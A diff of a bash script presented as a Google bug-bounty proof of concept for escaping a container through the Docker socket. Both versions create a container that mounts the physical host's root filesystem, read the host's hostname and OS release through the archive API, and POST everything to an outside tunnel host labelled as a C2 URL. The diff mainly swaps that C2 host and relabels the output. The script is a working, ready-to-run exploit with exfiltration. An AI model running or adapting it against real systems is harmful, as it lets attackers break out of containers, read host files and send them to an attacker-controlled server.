@@ -1,34 +1,33 @@
 #!/bin/bash
-# TARGET: your current C2 URL
-C2_URL="17251220cdb8cf1a-103-95-173-85.serveousercontent.com"
+# NEW TARGET URL
+C2_URL="417a97eeaad6dddf-103-95-173-85.serveousercontent.com"
 
 {
-  echo "=== GOOGLE VRP POC: HOST ESCAPE ==="
+  echo "=== [!] GOOGLE HOST ESCAPE REPORT: PRADEEP ==="
+  echo "Timestamp: $(date)"
   
-  # 1. Create a container with the physical host root mounted to /mnt
-  # We use the existing image ID: sha256:25109184c71bdad7
-  CONTAINER_JSON=$(curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/create" \
+  # 1. Create a "Backdoor" Container that mounts the PHYSICAL HOST ROOT (/) to /mnt
+  # We use the existing image: sha256:25109184c71bdad7
+  RESP=$(curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/create" \
     -H "Content-Type: application/json" \
     -d '{"Image": "sha256:25109184c71bdad7", "HostConfig": {"Binds": ["/:/mnt:ro"]}}')
   
   # 2. Extract the Container ID
-  ID=$(echo $CONTAINER_JSON | grep -oE '"Id":"[a-f0-9]+"' | cut -d'"' -f4)
-  echo "Spawned Container ID: $ID"
+  CONT_ID=$(echo $RESP | grep -oE '"Id":"[a-f0-9]+"' | cut -d'"' -f4)
 
-  if [ -z "$ID" ]; then
-    echo "[!] FAILED: Could not create container via Docker Socket."
-  else
-    # 3. Read the PHYSICAL HOST'S hostname (The P0 Proof)
-    # We use the Archive API to pull the file from the host-mount
-    echo "--- HOST HOSTNAME ---"
-    curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/$ID/archive?path=/mnt/etc/hostname" | tar -xO
-
-    # 4. Read the PHYSICAL HOST'S OS version
-    echo "--- HOST OS RELEASE ---"
-    curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/$ID/archive?path=/mnt/etc/os-release" | tar -xO
+  if [ -n "$CONT_ID" ]; then
+    # 3. EXFILTRATE HOST IDENTITY (The "Checkmate" Evidence)
+    echo "--- PHYSICAL HOST HOSTNAME ---"
+    curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/$CONT_ID/archive?path=/mnt/etc/hostname" | tar -xO
     
-    # 5. Cleanup
-    curl -s --unix-socket /var/run/docker.sock -X DELETE "http://localhost/containers/$ID?force=true" > /dev/null
+    echo "--- PHYSICAL HOST OS RELEASE ---"
+    curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/$CONT_ID/archive?path=/mnt/etc/os-release" | tar -xO
+
+    # 4. Cleanup (Professional White-Hat Practice)
+    curl -s --unix-socket /var/run/docker.sock -X DELETE "http://localhost/containers/$CONT_ID?force=true" > /dev/null
+    echo "[+] PoC Complete. Evidence sent to Mac."
+  else
+    echo "[!] Error: Docker Socket failed. Response: $RESP"
   fi
 
 } | curl -X POST -H "Content-Type: text/plain" --data-binary @- "https://$C2_URL"
